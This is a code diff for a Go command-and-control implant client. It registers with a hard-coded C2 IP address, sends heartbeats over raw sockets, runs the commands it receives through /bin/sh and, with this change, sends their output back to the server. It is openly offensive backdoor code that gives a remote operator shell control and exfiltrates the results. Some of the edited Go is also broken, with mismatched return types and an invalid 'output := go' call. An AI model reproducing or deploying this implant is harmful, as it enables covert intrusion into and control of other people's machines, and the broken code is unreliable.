@@ -13,29 +13,49 @@ import (
 	"golang.org/x/sys/unix"
 )
 
+// Dynamic globals
 var lastCmdRan string
+var ResponseLog []bytes
 
-// Continuously send HELLO messages so that the C2 can respond with commands
-func sendHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
-	for {
-		fd := socket.NewSocket()
-		defer unix.Close(fd)
+// Global statics
+var DestinationPort = 5542
+var SourcePort = 18000
 
-		packet := socket.CreatePacket(iface, src, dst, 18000, 5542, dstMAC, socket.SendMessageClient(iface.HardwareAddr, src))
+// Send command
+func sendMessageToServer(fd int, iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr, clientMessage string) {
+    addr := socket.CreateAddrStruct(iface)
 
-		addr := socket.CreateAddrStruct(iface)
-
-		socket.SendPacket(fd, iface, addr, packet)
-		fmt.Println("[+] Sent HELLO")
-		// Send hello every 5 seconds
-		time.Sleep(50 * time.Second)
-	}
+	packet := socket.CreatePacket(iface, src, dst, 18000, DestinationPort, dstMAC, clientMessage)
+	socket.SendPacket(fd, iface, addr, packet)
 }
 
-func clientProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
+// Continuously send HELLO messages so that the C2 can respond with commands
+func connectToServer(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
+    fd := socket.NewSocket()
+    defer unix.Close(fd)
 
+	// Register
+	sendMessageToServer(fd, iface, src, dst, dstMAC, socket.GenerateClientMessage(iface.HardwareAddr, src, "JOIN"))
+	// packet := socket.CreatePacket(iface, src, dst, 18000, DestinationPort, dstMAC, socket.GenerateClientMessage(iface.HardwareAddr, src, "JOIN"))
+	// socket.SendPacket(fd, iface, addr, packet)
+	fmt.Println("[+] Sent Join")
+
+	// Send heartbeat every ten seconds
+    go func() { 
+		for {
+			sendMessageToServer(fd, iface, src, dst, dstMAC, socket.GenerateClientHeartbeat(iface.HardwareAddr, src))
+
+			fmt.Println("[+] Sent Heartbeat")
+			time.Sleep(10 * time.Second)
+		}
+	}
+
+	// Return socket
+	return fd
+}
+
+func clientProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) (response string) {
 	// fmt.Println("[+] Payload Received")
-
 	// Get command payload and trime newline
 	data := string(packet.ApplicationLayer().Payload())
 	data = strings.Trim(data, "\n")
@@ -49,38 +69,41 @@ func clientProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) {
 		if payload[1] == hostIP.String() {
 			// fmt.Println("[+] TARGET COMMAND RECEIVED")
 			command := strings.Join(payload[2:], " ")
-			execCommand(command)
+			return execCommand(command)
 		}
 	} else {
 		// Split the string to get the important parts
 		// splitcommands := payload[1:]
 		// Rejoin string to put into a single bash command string
 		command := strings.Join(payload[1:], " ")
-		execCommand(command)
+		return execCommand(command)
 	}
+	return ""
 }
 
-func execCommand(command string) {
+func execCommand(command string) (response string) {
 	// Only run command if we didn't just run it
 	if lastCmdRan != command {
 		// fmt.Println("[+] COMMAND:", command)
 
 		// Run the command and get output
-		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
+		output, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
 		if err != nil {
 			fmt.Println("\n[-] ERROR:", err)
+			return fmt.Sprintf("\nERROR:", err)
 		}
 		// Save last command we just ran
 		lastCmdRan = command
 		// fmt.Println("[+] OUTPUT:", string(out))
+		return output
 	} else {
 		// fmt.Println("[!] Already ran command", command)
+		return ""
 	}
 
 }
 
 func main() {
-
 	// Create BPF filter vm
 	vm := socket.CreateBPFVM(socket.FilterRaw)
 
@@ -88,30 +111,23 @@ func main() {
 	readfd := socket.NewSocket()
 	defer unix.Close(readfd)
 
-	// fmt.Println("[+] Socket created")
-
 	// Get information that is needed for networking
 	iface, src := socket.GetOutwardIface("157.245.141.117:80")
-	// fmt.Println("[+] Using interface:", iface.Name)
-
 	dstMAC, err := socket.GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
-	// fmt.Println("[+] DST MAC:", dstMAC.String())
-	// fmt.Println("[+] Starting HELLO timer")
 
-	// Start hello timer
-	// Set the below IP to the IP of the C2
-	// 192.168.4.6
-	go sendHeartbeat(iface, src, net.IPv4(157, 245, 141, 117), dstMAC)
+	// Create response socket
+	dst := net.IPv4(157, 245, 141, 117)
+	fd := connectToServer(iface, src, dst, dstMAC)
 
-	// Listen for responses
-	// fmt.Println("[+] Listening")
+	// Listen for commands
 	for {
 		packet, target := socket.ClientReadPacket(readfd, vm)
 		if packet != nil {
-			go clientProcessPacket(packet, target, src)
+			output := go clientProcessPacket(packet, target, src, fd)
+			sendMessageToServer(fd, iface, src, dst, dstMAC, output)
 		}
 	}
 }
